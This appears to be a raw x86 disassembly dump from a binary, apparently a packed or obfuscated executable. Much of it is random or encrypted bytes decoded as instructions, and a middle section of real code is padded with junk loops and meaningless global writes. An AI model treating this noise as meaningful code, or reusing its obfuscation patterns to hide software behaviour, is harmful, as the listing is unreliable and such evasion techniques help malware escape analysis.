  41615d:	in     al,0x5a
  41615f:	mov    dh,0x5b
  416161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416162:	add    ch,BYTE PTR [esi+0x54d08884]
  416168:	in     eax,0x4
  41616a:	xchg   ecx,eax
  41616b:	sahf   
  41616c:	out    dx,eax
  41616d:	call   0x688bbcad
  416172:	adc    edx,DWORD PTR [eax]
  416174:	adc    al,0x20
  416176:	fsubr  st,st(7)
  416178:	and    BYTE PTR [ecx+0x2bd02bfa],ch
  41617e:	xor    eax,0xe5057fb4
  416183:	sbb    DWORD PTR [ebx+0x33dc90e7],ebp
  416189:	xchg   ebx,eax
  41618a:	stc    
  41618b:	adc    al,0x0
  41618d:	pop    ebx
  41618e:	loope  0x4161ab
  416190:	cmp    ch,al
  416192:	std    
  416193:	sahf   
  416194:	ss ret 
  416196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416197:	and    al,0x74
  416199:	push   eax
  41619a:	mov    ds:0xe7ae8988,al
  41619f:	xor    DWORD PTR [esi],edi
  4161a1:	cwde   
  4161a2:	test   BYTE PTR [ecx],dl
  4161a4:	xlat   BYTE PTR ds:[ebx]
  4161a5:	sbb    edx,DWORD PTR [esi+eiz*1]
  4161a8:	sub    dl,BYTE PTR [ecx-0x7e380865]
  4161ae:	(bad)  
  4161af:	push   ebp
  4161b0:	jmp    0x1096e4a6
  4161b5:	mov    edi,0x7aec5238
  4161ba:	add    ch,0xee
  4161bd:	imul   edi,DWORD PTR [esi+0xc83949a],0x57
  4161c4:	addr16 jmp 0xcc310e23
  4161ca:	sbb    ah,BYTE PTR [edi]
  4161cc:	sbb    bh,BYTE PTR [ecx-0x491d63a]
  4161d2:	inc    eax
  4161d3:	push   esi
  4161d4:	mov    al,0x80
  4161d6:	dec    edx
  4161d7:	mov    cl,0x44
  4161d9:	or     al,al
  4161db:	add    BYTE PTR [ecx],0xf
  4161de:	fild   WORD PTR [ebp-0x12aed286]
  4161e4:	call   0x58a5:0x30377b10
  4161eb:	mov    ds:0x42ff22a5,al
  4161f0:	push   esi
  4161f1:	pop    ebx
  4161f2:	inc    eax
  4161f3:	lds    edi,FWORD PTR [eax+0x192025ae]
  4161f9:	retf   
  4161fa:	sub    al,0x4d
  4161fc:	mov    ds:0x7953504,al
  416201:	sbb    al,0xc2
  416203:	push   ss
  416204:	pop    ebx
  416205:	jmp    0xccc2:0x99651865
  41620c:	enter  0x25fb,0xc3
  416210:	push   0xffffffb7
  416212:	mov    edi,0x5027ac72
  416217:	stos   DWORD PTR es:[edi],eax
  416218:	and    esp,DWORD PTR [edx]
  41621a:	pop    ebx
  41621b:	xchg   ebx,eax
  41621c:	loope  0x4161eb
  41621e:	out    0x4c,al
  416220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416221:	adc    al,0xd8
  416223:	xor    al,0xa1
  416225:	lock sub eax,0xda3c0849
  41622b:	int3   
  41622c:	inc    esp
  41622d:	stos   BYTE PTR es:[edi],al
  41622e:	cld    
  41622f:	cmp    bl,al
  416231:	stos   BYTE PTR es:[edi],al
  416232:	addr16 dec eax
  416234:	rcl    DWORD PTR [ecx+0x6553dc53],1
  41623a:	inc    edi
  41623b:	div    dl
  41623d:	scas   eax,DWORD PTR es:[edi]
  41623e:	ret    0x7d0d
  416241:	adc    dl,BYTE PTR [eax+0x4]
  416244:	in     eax,0x5
  416246:	jl     0x4161cd
  416248:	fistp  DWORD PTR [ecx+0xf]
  41624b:	cmp    eax,0xa63a40b9
  416250:	mov    WORD PTR [eax+0x1e],ss
  416253:	push   ebx
  416254:	lock retf 0xb135
  416258:	mov    ecx,0x6d8381ef
  41625d:	dec    esp
  41625e:	xor    eax,0x9635ec4c
  416263:	adc    DWORD PTR [ecx],eax
  416265:	out    dx,eax
  416266:	mov    al,ah
  416268:	xchg   esi,eax
  416269:	jge    0x416204
  41626b:	mov    WORD PTR [ebp+0x9],es
  41626e:	clc    
  41626f:	dec    ebp
  416270:	clc    
  416271:	in     al,0x2c
  416273:	push   ebx
  416274:	xor    BYTE PTR [edx+0x1f548301],bl
  41627a:	jmp    0x30b6a016
  41627f:	push   ebp
  416280:	fsubr  QWORD PTR [ebx+0x75]
  416283:	jecxz  0x416294
  416285:	iret   
  416286:	add    BYTE PTR [esi+0x4cbce281],bh
  41628c:	fstp   DWORD PTR [ebx-0x519fbc5d]
  416292:	hlt    
  416293:	mov    ah,0xd0
  416295:	repz scas eax,DWORD PTR es:[edi]
  416297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416298:	jg     0x4162ee
  41629a:	addr16 das 
  41629c:	call   0x488ef992
  4162a1:	inc    esi
  4162a2:	ror    ebx,cl
  4162a4:	push   ebp
  4162a5:	xor    esp,DWORD PTR ds:0x51139734
  4162ab:	pop    ebx
  4162ac:	xor    al,0xa9
  4162ae:	(bad)  
  4162af:	cmp    al,0xde
  4162b1:	nop
  4162b2:	out    dx,al
  4162b3:	xchg   edi,eax
  4162b4:	jmp    0xe7a5:0x5b007e44
  4162bb:	add    al,0x42
  4162bd:	int    0x8c
  4162bf:	jp     0x416244
  4162c1:	pop    es
  4162c2:	je     0x4162ae
  4162c4:	daa    
  4162c5:	sbb    eax,0xad8e5c82
  4162ca:	inc    esp
  4162cb:	cdq    
  4162cc:	jmp    DWORD PTR [ecx]
  4162ce:	xchg   ebx,eax
  4162cf:	dec    edx
  4162d0:	ss je  0x4162a1
  4162d3:	fsubr  st,st(5)
  4162d5:	lods   eax,DWORD PTR cs:[esi]
  4162d7:	jg     0x41631d
  4162d9:	jle    0x4162c0
  4162db:	arpl   dx,bp
  4162dd:	inc    edi
  4162de:	push   cs
  4162df:	pshufw mm6,mm1,0x34
  4162e3:	das    
  4162e4:	jbe    0x4162fb
  4162e6:	cmp    eax,0xa13270db
  4162eb:	stos   BYTE PTR es:[edi],al
  4162ec:	mov    al,0x49
  4162ee:	scas   eax,DWORD PTR es:[edi]
  4162ef:	(bad)  
  4162f0:	adc    BYTE PTR [ebp+0x2b],al
  4162f3:	mov    ecx,0x3145d83d
  4162f8:	out    0x2d,eax
  4162fa:	and    al,0x95
  4162fc:	jmp    0x4162d6
  4162fe:	cdq    
  4162ff:	pop    ebx
  416300:	jmp    0xcec09bc0
  416305:	test   DWORD PTR [ebx+0x27537808],ebx
  41630b:	dec    esp
  41630c:	inc    esp
  41630d:	push   ecx
  41630e:	jl     0x4162ee
  416310:	xchg   ah,cl
  416312:	fist   DWORD PTR [edi-0xad0a503]
  416318:	xor    eax,0x9b2e3cb
  41631d:	inc    ebp
  41631e:	and    dh,cl
  416320:	jno    0x416333
  416322:	mov    BYTE PTR [eax+0x15a177e2],ch
  416328:	xlat   BYTE PTR ds:[ebx]
  416329:	sub    ah,bh
  41632b:	cmp    DWORD PTR [edx-0x5f],0x2a
  41632f:	xor    al,0xb8
  416331:	sbb    bl,BYTE PTR [ebp+0x57fd5855]
  416337:	(bad)  
  416338:	jnp    0x416398
  41633a:	jns    0x416367
  41633c:	ins    BYTE PTR es:[edi],dx
  41633d:	lahf   
  41633e:	popf   
  41633f:	cmp    al,0xaf
  416341:	(bad)  
  416342:	jge    0x416331
  416344:	rsqrtps xmm5,XMMWORD PTR [ecx-0x6a0dc260]
  41634b:	out    dx,eax
  41634c:	in     al,dx
  41634d:	mov    ecx,0xb4acf41d
  416352:	sar    BYTE PTR [edx+0x1c9a7b64],0xf1
  416359:	hlt    
  41635a:	xor    bh,BYTE PTR [edx-0x7421adbf]
  416360:	ret    0x20b8
  416363:	or     edx,DWORD PTR [ecx]
  416365:	cs repz add al,0x44
  416369:	mov    esp,0x5ebc65cf
  41636e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41636f:	and    al,0x4d
  416371:	loopne 0x416396
  416373:	daa    
  416374:	lock stos BYTE PTR es:[edi],al
  416376:	xchg   edx,eax
  416377:	clc    
  416378:	dec    ecx
  416379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637a:	in     eax,0xf8
  41637c:	rcl    DWORD PTR [ebx-0x51],1
  41637f:	jge    0x416326
  416381:	std    
  416382:	sub    BYTE PTR [ebx-0x50384989],al
  416388:	rol    DWORD PTR [ebp-0x7a10342b],0xcc
  41638f:	cmc    
  416390:	fisubr WORD PTR [ebx+0x7737f692]
  416396:	je     0x416330
  416398:	and    DWORD PTR [edi+0x65],eax
  41639b:	and    al,0x37
  41639d:	pop    esp
  41639e:	shr    BYTE PTR [eax],0x10
  4163a1:	mov    DWORD PTR [edx-0x1c],0xf906542c
  4163a8:	push   DWORD PTR [ecx]
  4163aa:	inc    edx
  4163ab:	dec    dx
  4163ad:	mov    dh,0x55
  4163af:	mov    ch,BYTE PTR [ecx+0x42]
  4163b2:	sub    BYTE PTR [esi],ch
  4163b4:	sub    bl,BYTE PTR [ebx-0x54]
  4163b7:	test   eax,0x262e92e9
  4163bc:	test   DWORD PTR [edx+0x415e8e17],ebp
  4163c2:	jmp    0xc0e89d3d
  4163c7:	dec    esi
  4163c8:	jg     0x41637b
  4163ca:	mov    WORD PTR [edi+0x26eda15c],?
  4163d0:	jecxz  0x416389
  4163d2:	enter  0x9861,0x3c
  4163d6:	mov    ebp,edx
  4163d8:	xchg   esp,eax
  4163d9:	rcl    BYTE PTR [edx],cl
  4163db:	int    0xaa
  4163dd:	nop
  4163de:	push   0x52
  4163e0:	fs pop edi
  4163e2:	int3   
  4163e3:	retf   
  4163e4:	jnp    0x41641b
  4163e6:	sbb    eax,0x8567737f
  4163eb:	push   esi
  4163ec:	jg     0x41639f
  4163ee:	ins    BYTE PTR es:[edi],dx
  4163ef:	mov    ecx,0x93b7c408
  4163f4:	mov    al,cl
  4163f6:	bnd jb 0x41640f
  4163f9:	jbe    0x416442
  4163fb:	cdq    
  4163fc:	inc    ebx
  4163fd:	hlt    
  4163fe:	aam    0xf0
  416400:	loope  0x41647e
  416402:	and    DWORD PTR [ebp+eiz*1-0x8],edx
  416406:	mov    al,BYTE PTR [ecx]
  416408:	fadd   QWORD PTR [edi+0x28]
  41640b:	cli    
  41640c:	pop    DWORD PTR [edi+0x29117a95]
  416412:	add    BYTE PTR [ebx],bl
  416414:	imul   eax,ebp,0xf
  416417:	jecxz  0x416475
  416419:	xor    edx,edi
  41641b:	hlt    
  41641c:	xor    ebp,0x85615be1
  416422:	mov    esp,0x17fd7a25
  416427:	jns    0x416465
  416429:	bound  edi,QWORD PTR [esi-0x30]
  41642c:	push   0x24
  41642e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41642f:	mov    WORD PTR [ecx-0x1b],?
  416432:	loop   0x416422
  416434:	xchg   edi,eax
  416435:	mov    bl,0xc1
  416437:	popf   
  416438:	cmp    ah,BYTE PTR [esi-0x7541d5ed]
  41643e:	mov    edx,0xcbe5de29
  416443:	dec    ebx
  416444:	test   BYTE PTR es:[edi+0x54],0x6c
  416449:	sbb    ax,0x69b1
  41644d:	mov    ebx,0x385bf32a
  416452:	pop    edi
  416453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416454:	sbb    BYTE PTR [ebp+0xb],cl
  416457:	test   BYTE PTR [ecx],cl
  416459:	xchg   DWORD PTR [edx],ebp
  41645b:	mov    edi,0xb58af782
  416460:	jae    0x41641f
  416462:	je     0x4164c2
  416464:	rcr    BYTE PTR [eax+0x5],cl
  416467:	outs   dx,BYTE PTR ds:[esi]
  416468:	cs sti 
  41646a:	inc    esi
  41646b:	dec    ebx
  41646c:	call   FWORD PTR ds:0xd741117f
  416472:	push   0x7db80dcc
  416477:	retf   0x8ffd
  41647a:	ja     0x416444
  41647c:	int    0x9b
  41647e:	imul   eax,DWORD PTR [eax+ebx*8],0xe183b485
  416485:	fwait
  416486:	(bad)  
  416487:	mov    edx,0x9a40025a
  41648c:	icebp  
  41648d:	ret    
  41648e:	fwait
  41648f:	xchg   esi,eax
  416490:	inc    ebp
  416491:	stos   BYTE PTR es:[edi],al
  416492:	mov    ds:0x7dda9cbc,eax
  416497:	pop    ds
  416498:	mov    esp,DWORD PTR [eax+0xd]
  41649b:	mov    eax,ds:0x91a2a027
  4164a0:	xor    DWORD PTR [eax],eax
  4164a2:	sbb    al,0xea
  4164a4:	mov    al,ds:0x448609e0
  4164a9:	stc    
  4164aa:	mov    ebp,0xfe46bcce
  4164af:	fldcw  WORD PTR [eax+edx*1]
  4164b2:	mov    ebp,DWORD PTR [ebx]
  4164b4:	loopne 0x416525
  4164b6:	jge    0x416471
  4164b8:	faddp  st(0),st
  4164ba:	mov    bh,0x74
  4164bc:	xor    eax,0x97f75666
  4164c1:	data16 cmp BYTE PTR [ecx-0x44],bl
  4164c5:	loope  0x41651d
  4164c7:	clc    
  4164c8:	shl    bl,0x98
  4164cb:	or     esi,esi
  4164cd:	cmc    
  4164ce:	jae    0x41654c
  4164d0:	push   ebp
  4164d1:	mov    BYTE PTR [ebx+ebx*4],dl
  4164d4:	mov    eax,cr5
  4164d7:	sahf   
  4164d8:	push   esi
  4164d9:	pop    ds
  4164da:	jno    0x416527
  4164dc:	dec    ecx
  4164dd:	xlat   BYTE PTR ds:[ebx]
  4164de:	repnz pop esi
  4164e0:	pop    edi
  4164e1:	mov    al,ds:0x6f7acfe6
  4164e6:	jp     0x416552
  4164e8:	inc    esi
  4164e9:	sub    edx,ecx
  4164eb:	aad    0xf0
  4164ed:	push   0x43
  4164ef:	sbb    eax,DWORD PTR [esp+ebx*2+0x36]
  4164f3:	fld    QWORD PTR [edx+eiz*8-0x13e1ac12]
  4164fa:	sub    BYTE PTR [edi],0xc7
  4164fd:	jae    0x416522
  4164ff:	sub    esp,DWORD PTR [edx+esi*2+0x62db28d6]
  416506:	popa   
  416507:	lods   al,BYTE PTR ds:[esi]
  416508:	fidivr DWORD PTR [edi-0x7ad5311]
  41650e:	cmp    DWORD PTR [ebx],edx
  416510:	das    
  416511:	adc    al,0xbf
  416513:	lods   al,BYTE PTR ds:[esi]
  416514:	mov    WORD PTR [ebp+0x28],ds
  416517:	xor    DWORD PTR [esi+ebx*4-0x2d],edx
  41651b:	dec    eax
  41651c:	and    eax,0x10062af8
  416521:	pop    edi
  416522:	jge    0x41652e
  416524:	sbb    BYTE PTR [edx],dh
  416526:	shl    eax,cl
  416528:	aaa    
  416529:	push   ds
  41652a:	jp     0x416537
  41652c:	call   0xe7687436
  416531:	btc    DWORD PTR [esi],esp
  416534:	mov    ecx,0xfdebecfc
  416539:	mov    eax,ds:0x975b09b3
  41653e:	adc    bl,dh
  416540:	fimul  DWORD PTR [edi-0x60]
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42a9e3
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42a9e7
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42a9eb
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42a9ef
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9bb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42976f
  416825:	mov    ebx,DWORD PTR ds:0x429bef
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9bf
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9c3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9cb
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	icebp  
  416a62:	push   cs
  416a63:	mov    edx,0x8244f918
  416a68:	and    edi,0x60
  416a6b:	add    DWORD PTR [ebx+0xe8e36ca],0xffffffd1
  416a72:	setae  BYTE PTR [edx]
  416a75:	(bad)  
  416a76:	xchg   ebx,eax
  416a77:	shr    BYTE PTR [eax+0x9c322a7],0xf7
  416a7e:	iret   
  416a7f:	mov    cl,0xcd
  416a81:	mov    al,ds:0x692d4178
  416a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a87:	mov    ?,WORD PTR [edx+0x1dd2a004]
  416a8d:	scas   eax,DWORD PTR es:[edi]
  416a8e:	xor    al,0x7f
  416a90:	gs push 0x63a82f3f
  416a96:	popa   
  416a97:	sbb    ch,dl
  416a99:	sbb    al,0xb
  416a9b:	cmc    
  416a9c:	inc    edi
  416a9d:	inc    edi
  416a9e:	outs   dx,BYTE PTR ds:[esi]
  416a9f:	call   0x1f2f986b
  416aa4:	xor    bl,BYTE PTR [ecx+0x56]
  416aa7:	and    dl,BYTE PTR [ebp+0xf]
  416aaa:	ins    DWORD PTR es:[edi],dx
  416aab:	xchg   BYTE PTR [ecx+0x267f24b1],ch
  416ab1:	mov    esi,0xa275b4c3
  416ab6:	mov    cl,0x2
  416ab8:	or     DWORD PTR es:[edi-0x18],ecx
  416abc:	fsubr  st(1),st
  416abe:	iret   
  416abf:	mov    ds:0x11e25f90,eax
  416ac4:	adc    ch,cl
  416ac6:	cmp    DWORD PTR [ebp+0x3],esi
  416ac9:	cld    
  416aca:	stc    
  416acb:	jecxz  0x416ae0
  416acd:	adc    ecx,esp
  416acf:	stc    
  416ad0:	sub    dl,BYTE PTR [ebp+eiz*4-0x39]
  416ad4:	sbb    BYTE PTR [esi-0x19],0x99
  416ad8:	xchg   si,ax
  416ada:	ror    DWORD PTR [edi],cl
  416adc:	rcr    BYTE PTR [edi-0x8],cl
  416adf:	mov    ebp,0x671a0ed0
  416ae4:	outs   dx,BYTE PTR ds:[esi]
  416ae5:	out    0x2b,al
  416ae7:	push   ss
  416ae8:	mov    edi,0x194817ea
  416aed:	aas    
  416aee:	sub    al,0x42
  416af0:	fild   DWORD PTR [ecx+ebp*1-0x27]
  416af4:	call   0x8a2c:0x42763f7d
  416afb:	frstor [ecx+ebx*2]
  416afe:	xlat   BYTE PTR ds:[ebx]
  416aff:	xor    al,0x59
  416b01:	je     0x416aa6
  416b03:	xchg   BYTE PTR [esi],bh
  416b05:	mov    cl,0x5b
  416b07:	out    dx,al
  416b08:	pushf  
  416b09:	cs dec ecx
  416b0b:	nop
  416b0c:	dec    ebx
  416b0d:	or     cl,dh
  416b0f:	sti    
  416b10:	mov    ebp,0xf7ec11d3
  416b15:	push   edi
  416b16:	imul   ebx,esi,0x536fbe77
  416b1c:	daa    
  416b1d:	cmp    esi,DWORD PTR [edi+0x4c1c108f]
  416b23:	aas    
  416b24:	icebp  
  416b25:	add    BYTE PTR fs:[ecx+ebp*4-0x7d],0x75
  416b2b:	jg     0x416b44
  416b2d:	inc    dh
  416b2f:	add    esi,edi
  416b31:	in     eax,0x92
  416b33:	xchg   esp,eax
  416b34:	dec    ebx
  416b35:	call   0x52ecc5ab
  416b3a:	sahf   
  416b3b:	sbb    BYTE PTR [ecx],0x34
